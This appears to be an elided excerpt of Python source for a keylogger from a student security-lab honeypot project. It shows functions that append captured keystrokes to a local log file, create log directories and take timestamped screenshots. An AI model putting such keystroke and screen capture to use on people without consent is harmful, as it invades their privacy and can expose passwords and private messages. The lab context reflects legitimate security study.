...
def write_file(keys):                  #To write the keys to the Files
    with open("E:/Winter semester 2023-24/ISM LAB/Honeypot project/Keylogger/log.txt","a") as f:
        for key in keys:
            k=str(key).replace("'","")
...
class keylogger_main:
    ...
    def _build_logs(self):             #To create the directory which contains all the screenshots and log files 
        if not os.path.exists('E:/Winter semester 2023-24/ISM LAB/Honeypot project/Keylogger'):
            os.mkdir('E:/Winter semester 2023-24/ISM LAB/Honeypot project/Keylogger')
            os.mkdir('E:/Winter semester 2023-24/ISM LAB/Honeypot project/Keylogger/Screenshots')
    ...
    def _Screenshot(self):           #Main Function to start thr Screenshot tracker
        sct=mss()
        sct.shot(output='E:/Winter semester 2023-24/ISM LAB/Honeypot project/Keylogger/Screenshots/{}.png'.format(time.time()))
